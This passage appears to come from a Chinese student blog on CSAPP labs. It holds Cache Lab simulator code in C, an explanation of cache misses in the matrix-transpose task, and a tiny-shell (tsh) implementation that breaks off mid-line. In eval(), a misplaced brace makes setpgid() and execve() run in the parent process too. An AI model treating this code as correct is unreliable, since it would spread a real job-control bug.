<span class="keyword">if</span> (verbosity)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;hit &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> tempLRU_count = cache-&gt;sets[setIndex].lines[hitIndex].LRU_count;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; cache-&gt;E; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (i != hitIndex) &#123;</span><br><span class="line">                <span class="keyword">if</span> (cache-&gt;sets[setIndex].lines[i].LRU_count &lt;  tempLRU_count) &#123;<span class="comment">//less than the hit one&#x27;s LRU</span></span><br><span class="line">                    cache-&gt;sets[setIndex].lines[i].LRU_count++;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; </span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">                cache-&gt;sets[setIndex].lines[i].LRU_count = <span class="number">0</span>;<span class="comment">// the hit one&#x27;s LRU is set to zero</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">store</span><span class="params">(Cache *cache, <span class="keyword">int</span> setIndex, <span class="keyword">int</span> tag, <span class="keyword">int</span> verbosity)</span> </span>&#123;<span class="comment">//store is just like a load</span></span><br><span class="line">    load(cache, setIndex, tag, verbosity);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">modify</span><span class="params">(Cache *cache, <span class="keyword">int</span> setIndex, <span class="keyword">int</span> tag, <span class="keyword">int</span> verbosity)</span> </span>&#123;<span class="comment">// a write is just like one load then one store</span></span><br><span class="line">    load(cache, setIndex, tag, verbosity);</span><br><span class="line">    store(cache, setIndex, tag, verbosity);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">replayTrace</span><span class="params">(<span class="keyword">int</span> s, <span class="keyword">int</span> E, <span class="keyword">int</span> b, <span class="keyword">char</span>* buf, <span class="keyword">int</span> verbosity, Cache* cache)</span> </span>&#123;</span><br><span class="line">FILE *file;                        <span class="comment">// pointer to FILE object </span></span><br><span class="line">file = fopen(buf, <span class="string">&quot;r&quot;</span>);</span><br><span class="line"><span class="keyword">char</span> type;                          <span class="comment">// L-load S-store M-modify </span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> address;              <span class="comment">// 64-bit  memory address </span></span><br><span class="line"><span class="keyword">int</span> size;                           <span class="comment">//number of bytes accessed by operation </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> tag_move_bits = b + s;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (<span class="built_in">fscanf</span>(file, <span class="string">&quot; %c %lx,%d&quot;</span>, &amp;type, &amp;address, &amp;size) &gt; <span class="number">0</span>) &#123;<span class="comment">//for every line in the file</span></span><br><span class="line"><span class="keyword">if</span> (type == <span class="string">&#x27;I&#x27;</span>) &#123;</span><br><span class="line"><span class="keyword">continue</span>;<span class="comment">//if it is an instruction, do nothing</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">int</span> tag = address &gt;&gt; tag_move_bits;<span class="comment">//get the tag</span></span><br><span class="line"><span class="keyword">int</span> setIndex = (address &gt;&gt; b) &amp; ((<span class="number">1</span> &lt;&lt; s) - <span class="number">1</span>);<span class="comment">//get the index</span></span><br><span class="line"><span class="keyword">if</span> (verbosity == <span class="number">1</span>) &#123;<span class="comment">//print detailed info</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%c %lx,%d &quot;</span>, type, address, size);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (type == <span class="string">&#x27;S&#x27;</span>) &#123;</span><br><span class="line">store(cache, setIndex, tag, verbosity);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (type == <span class="string">&#x27;M&#x27;</span>) &#123;</span><br><span class="line">modify(cache, setIndex, tag, verbosity);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (type== <span class="string">&#x27;L&#x27;</span>) &#123;</span><br><span class="line">load(cache, setIndex, tag, verbosity);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (verbosity == <span class="number">1</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">fclose(file);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="Part-B"><a href="#Part-B" class="headerlink" title="Part B"></a>Part B</h4><p>首先要明确，尽管矩阵的转置本身导致对于A矩阵（原始矩阵）的读和B矩阵（转置矩阵）的写不可能同时为连续的（即不可能同时存在连续读和连续写——对A矩阵行的连续读必然导致对B矩阵列的非连续写）。<br>但只要矩阵的大小小于缓存的总大小，那么在理想的情况下，在最初的强制不命中（即缓存为空导致的不命中）后，整个矩阵都会被加载进入缓存。在这之后的所有对于B矩阵的不连续写的引用都会命中。</p><p><strong>在该实验中</strong>，缓存采用的是直接映射高速缓存，s = 5，b = 5，E = 1。对于该缓存，总共存在32个组，每个组共32个字节，可以装入8个int型变量，是非常有限的缓存，主要需要解决以下两个问题：</p><ol><li>直接映射缓存所带来的冲突不命中。观察程序中矩阵存储的位置即可以发现，矩阵A和矩阵B的同一行实际上被映射到了同一个缓存组。当进行对角线的引用时，一定会发生缓存的冲突不命中。需要仔细地处理对角线上的元素。</li><li>所需优化的矩阵的总大小超出了缓存的总大小。必然导致程序的访存效率低下。</li></ol><p>代码见GitHub。</p><blockquote><p>参考：</p><p><a href="https://blog.codedragon.tech/2017/09/25/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9FCacheLab-PartB%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/">https://blog.codedragon.tech/2017/09/25/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9FCacheLab-PartB%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/</a></p></blockquote><h3 id="Shell-Lab"><a href="#Shell-Lab" class="headerlink" title="Shell Lab"></a>Shell Lab</h3><p>任务：</p><ul><li><p>eval: 主要功能是解析cmdline，并且运行. [70 lines]</p></li><li><p>builtin cmd: 辨识和解析出bulidin命令: quit, fg, bg, and jobs. [25lines]</p></li><li><p>do bgfg: 实现bg和fg命令. [50 lines]</p></li><li><p>waitfg: 实现等待前台程序运行结束. [20 lines]</p></li><li><p>sigchld handler: 响应SIGCHLD. 80 lines]</p></li><li><p>sigint handler: 响应 SIGINT (ctrl-c) 信号. [15 lines]</p></li><li><p>sigtstp handler: 响应 SIGTSTP (ctrl-z) 信号. [15 lines]</p></li></ul><p>给出的函数：</p><ul><li><code>int parseline(const char *cmdline,char **argv)</code>：获取参数列表<code>char **argv</code>，返回是否为后台运行命令（<code>true</code>）。</li><li><code>void clearjob(struct job_t *job)</code>：清除<code>job</code>结构。</li><li><code>void initjobs(struct job_t *jobs)</code>：初始化<code>jobs</code>链表。</li><li><code>void maxjid(struct job_t *jobs)</code>：返回<code>jobs</code>链表中最大的<code>jid</code>号。</li><li><code>int addjob(struct job_t *jobs,pid_t pid,int state,char *cmdline)</code>：在<code>jobs</code>链表中添加<code>job</code></li><li><code>int deletejob(struct job_t *jobs,pid_t pid)</code>：在<code>jobs</code>链表中删除<code>pid</code>的<code>job</code>。</li><li><code>pid_t fgpid(struct job_t *jobs)</code>：返回当前前台运行<code>job</code>的<code>pid</code>号。</li><li><code>struct job_t *getjobpid(struct job_t *jobs,pid_t pid)</code>：返回<code>pid</code>号的<code>job</code>。</li><li><code>struct job_t *getjobjid(struct job_t *jobs,int jid)</code>：返回<code>jid</code>号的<code>job</code>。</li><li><code>int pid2jid(pid_t pid)</code>：将<code>pid</code>号转化为<code>jid</code>。</li><li><code>void listjobs(struct job_t *jobs)</code>：打印<code>jobs</code>。</li><li><code>void sigquit_handler(int sig)</code>：处理<code>SIGQUIT</code>信号。</li></ul><p>tsh应有的内置命令：</p><ul><li>quit: 退出当前shell</li><li>jobs: 列出所有后台运行的工作</li><li>bg <job>: 这个命令将会向<job>代表的工作发送SIGCONT信号并放在后台运行，<job>可以是一个PID也可以是一个JID（job ID）。</li><li>fg <job>: 这个命令会向<job>代表的工作发送SIGCONT信号并放在前台运行，<job>可以是一个PID也可以是一个JID</li></ul><blockquote><p>信号阻塞：</p><p>执行信号的处理动作成为信号递达（Delivery），信号从产生到递达之间的状态称为信号未决(Pending)。进程可以选择阻塞(Block)某个信号。<br>被阻塞的信号产生时将保持在未决状态，直到进程解除对此信号的阻塞，才执行递达的动作<br>注意：阻塞和忽略是不同的，只要信号被阻塞就不会递达，而忽略是在递达之后可选的一种处理动作<br>信号不会丢失，如果信号被阻塞，只会保持信号未决，但是信号不丢失</p></blockquote><p>对用户输入的参数进行解析并运行计算。书上已经给了 demo，我们优化一下即可。</p><p>有以下几点需要注意：</p><ul><li><code>SIGCHLD</code>信号：只要有一个子进程终止或者停止，内核就会发送一个 <code>SIGHLD</code>信号给父进程。</li><li>信号是不排队的。如果返回信号时，发现目的进程正在执行信号处理，那么该信号则会被阻塞，下一个则会被丢弃。因此，不能用信号来对其他进程中发生的事件计数。</li><li><strong>条件竞争</strong>：条件竞争是指一个系统的运行结果依赖于不受控制的事件的先后顺序。本例情况是，如果在<strong>父进程</strong>能够再次运行之前，子进程终止，返回信号，而此时父进程还没执行 <code>addjob</code>，而信号处理回收子进程，执行 <code>deletejob</code>，由于还没添加到列表，所以这个函数什么都做不了，而这结束后父进程又会添加子进程，而产生一个永远不会被删除的job。</li></ul><p>代码参考tshref 源码：</p><p><a href="https://github.com/hestati63/CS230-SP/blob/67bf24d0a7f7b18e1472eaf369c6449dbf7d8d48/Assignment5/tsh.c">https://github.com/hestati63/CS230-SP/blob/67bf24d0a7f7b18e1472eaf369c6449dbf7d8d48/Assignment5/tsh.c</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">eval</span><span class="params">(<span class="keyword">char</span> *cmdline)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *argv[MAXARGS]; <span class="comment">/* Argument list execve() */</span></span><br><span class="line">    <span class="keyword">char</span> buf[MAXLINE];   <span class="comment">/* Holds modified command line */</span></span><br><span class="line">    <span class="keyword">int</span> bg;              <span class="comment">/* Should the job run in bg or fg? */</span></span><br><span class="line">    <span class="keyword">pid_t</span> pid;           <span class="comment">/* Process id */</span></span><br><span class="line">    <span class="keyword">int</span> state = UNDEF;</span><br><span class="line">    <span class="keyword">sigset_t</span> mask_all, mask_one, prev_one;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">strcpy</span>(buf, cmdline);</span><br><span class="line">    bg = parseline(buf, argv); <span class="comment">//解析命令</span></span><br><span class="line">    <span class="keyword">if</span>(bg == <span class="number">1</span>) &#123; <span class="comment">//判断是否在后台</span></span><br><span class="line">        state = BG;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        state = FG;  </span><br><span class="line">    &#125;   </span><br><span class="line">    <span class="keyword">if</span> (argv[<span class="number">0</span>] == <span class="literal">NULL</span>)  &#123; <span class="keyword">return</span>; &#125;   <span class="comment">/* Ignore empty lines */</span></span><br><span class="line"></span><br><span class="line">    sigfillset(&amp;mask_all); <span class="comment">//防止竞争</span></span><br><span class="line">    sigemptyset(&amp;mask_one);</span><br><span class="line">    sigaddset(&amp;mask_one, SIGCHLD); <span class="comment">// ignore the SIGHLD</span></span><br><span class="line">    sigprocmask(SIG_BLOCK, &amp;mask_one, &amp;prev_one); <span class="comment">//block SIGHLD and save previous blocked set</span></span><br><span class="line">    <span class="keyword">if</span> (!builtin_cmd(argv)) &#123;  <span class="comment">//如果不是内置命令</span></span><br><span class="line">        <span class="keyword">if</span> ((pid = fork()) == <span class="number">0</span>) &#123;</span><br><span class="line">        sigprocmask(SIG_UNBLOCK, &amp;prev_one, <span class="literal">NULL</span>); <span class="comment">//Restore previous blocked set, unblocking SIGHLD</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (setpgid(<span class="number">0</span>, <span class="number">0</span>) &lt; <span class="number">0</span>) &#123; <span class="comment">// change the group id into pid</span></span><br><span class="line">            perror(<span class="string">&quot;SETPGID ERROR&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (execve(argv[<span class="number">0</span>], argv, environ) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%s: Command not found.\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    sigprocmask(SIG_BLOCK, &amp;mask_all, <span class="literal">NULL</span>);</span><br><span class="line">    addjob(jobs, pid, state, cmdline);  <span class="comment">//add job</span></span><br><span class="line">    sigprocmask(SIG_UNBLOCK, &amp;prev_one, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span>(state == FG) &#123; <span class="comment">// if FG wait until finsihed else just print message</span></span><br><span class="line">        waitfg(pid);  <span class="comment">//等待前台程序执行</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[%d] (%d) %s&quot;</span>, pid2jid(pid), pid, cmdline);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">builtin_cmd</span><span class="params">(<span class="keyword">char</span> **argv)</span> </span>&#123; <span class="comment">// 如果是内置命令则直接执行</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">&quot;quit&quot;</span>)) &#123;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">&quot;jobs&quot;</span>)) &#123;</span><br><span class="line">        listjobs(jobs); <span class="comment">//print the jobs</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">&quot;fg&quot;</span>) || !<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">&quot;bg&quot;</span>)) &#123;</span><br><span class="line">        do_bgfg(argv);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;     <span class="comment">/* not a builtin command */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">do_bgfg</span><span class="params">(<span class="keyword">char</span> **argv)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> parsed;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">job_t</span> *<span class="title">job</span>;</span></span><br><span class="line">    <span class="comment">// case no argument</span></span><br><span class="line">    <span class="keyword">if</span>(!argv[<span class="number">1</span>])&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s command requires PID or %%jobid argument\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// parse argument，其中%开头的数字是JobID，纯数字的是PID</span></span><br><span class="line">    <span class="keyword">if</span>(argv[<span class="number">1</span>][<span class="number">0</span>] == <span class="string">&#x27;%&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="built_in">sscanf</span>(&amp;argv[<span class="number">1</span>][<span class="number">1</span>], <span class="string">&quot;%d&quot;</span>,&amp;parsed))&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%s: argument must be a PID or %%jobid\n&quot;</span>,argv[<span class="number">0</span>]);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>((job = getjobjid(jobs, parsed)) == <span class="literal">NULL</span>)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%%%d: No such job\n&quot;</span>, parsed);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="built_in">sscanf</span>(argv[<span class="number">1</span>], <span class="string">&quot;%d&quot;</span>,&amp;parsed))&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%s: argument must be a PID or %%jobid\n&quot;</span>,argv[<span class="number">0</span>]);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>((job = getjobpid(jobs, parsed)) == <span class="literal">NULL</span>)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;(%d): No such process\n&quot;</span>, parsed);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">&quot;bg&quot;</span>)) &#123;</span><br><span class="line">        <span class="comment">// make state BG</span></span><br><span class="line">        job-&gt;state = BG;</span><br><span class="line">        <span class="comment">// send SIGCONT</span></span><br><span class="line">        <span class="keyword">if</span>(kill(-job-&gt;pid, SIGCONT) &lt; <span class="number">0</span>)</span><br><span class="line">            unix_error(<span class="string">&quot;kill error&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[%d] (%d) %s&quot;</span>, job-&gt;jid, job-&gt;pid, job-&gt;cmdline);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">&quot;fg&quot;</span>)) &#123;</span><br><span class="line">        job-&gt;state = FG;</span><br><span class="line">        <span class="comment">// send SIGCONT</span></span><br><span class="line">        <span class="keyword">if</span>(kill(-job-&gt;pid, SIGCONT) &lt; <span class="number">0</span>)</span><br><span class="line">            unix_error(<span class="string">&quot;kill error&quot;</span>);</span><br><span class="line">        <span class="comment">// wait until finish</span></span><br><span class="line">        waitfg(job-&gt;pid);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;do_bgfg: Internal error&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">waitfg</span><span class="params">(<span class="keyword">pid_t</span> pid)</span> </span>&#123; <span class="comment">//等待子进程结束</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">job_t</span> *<span class="title">job</span> = <span class="title">getjobpid</span>(<span class="title">jobs</span>, <span class="title">pid</span>);</span></span><br><span class="line">    <span class="keyword">if</span>(!job) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// while there is no FG process sleep</span></span><br><span class="line">    <span class="keyword">while</span>(job-&gt;state == FG)</span><br><span class="line">        sleep(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// verbose message</span></span><br><span class="line">    <span class="keyword">if</span>(verbose)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;waitfg: Process (%d) no longer the fg process\n&quot;</span>, pid);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sigchld_handler</span><span class="params">(<span class="keyword">int</span> sig)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> status, jid;</span><br><span class="line">    <span class="keyword">pid_t</span> pid;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">job_t</span> *<span class="title">job</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(verbose)</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;sigchld_handler: entering&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// waitpid to find pid</span></span><br><span class="line">    <span class="keyword">while</span>((pid = waitpid(<span class="number">-1</span>, &amp;status, WNOHANG | WUNTRACED)) &gt; <span class="number">0</span>)&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// if job deleted </span></span><br><span class="line">        <span class="keyword">if</span>((job = getjobpid(jobs, pid)) == <span class="literal">NULL</span>)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Lost track of (%d)\n&quot;</span>, pid);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        jid = job-&gt;jid;</span><br><span class="line">        <span class="comment">// stop signal</span></span><br><span class="line">        <span class="keyword">if</span>(WIFSTOPPED(status))&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Job [%d] (%d) stopped by signal %d\n&quot;</span>, jid, job-&gt;pid, WSTOPSIG(status));</span><br><span class="line">            job-&gt;state = ST;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// exit</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(WIFEXITED(status))&#123;</span><br><span class="line">            <span class="keyword">if</span>(deletejob(jobs, pid))</span><br><span class="line">                <span class="keyword">if</span>(verbose)&#123;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;sigchld_handler: Job [%d] (%d) deleted\n&quot;</span>, jid, pid);</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;sigchld_handler: Job [%d] (%d) terminates OK (status %d)\n&quot;</span>, jid, pid, WEXITSTATUS(status));</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// exit by signal</span></span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span>(deletejob(jobs, pid))&#123;</span><br><span class="line">                    <span class="keyword">if</span>(verbose)</span><br><span class="line">                        <span class="built_in">printf</span>(<span class="string">&quot;sigchld_handler: Job [%d] (%d) deleted\n&quot;</span>, jid, pid);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Job [%d] (%d) terminated by signal %d\n&quot;</span>, jid, pid, WTERMSIG(status));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// end handler</span></span><br><span class="line">    <span class="keyword">if</span>(verbose)</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;sigchld_handler: exiting&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * sigint_handler - The kernel sends a SIGINT to the shell whenver the</span></span><br><span class="line"><span class="comment"> *    user types ctrl-c at the keyboard.  Catch it and send it along</span></span><br><span class="line"><span class="comment"> *    to the foreground job.  </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sigint_handler</span><span class="params">(<span class="keyword">int</span> sig)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">pid_t</span> pid = fgpid(jobs);</span><br><span class="line">    <span class="keyword">if</span>(verbose)</span><br><span class="line">        <span class="built_in">puts</span>(<span 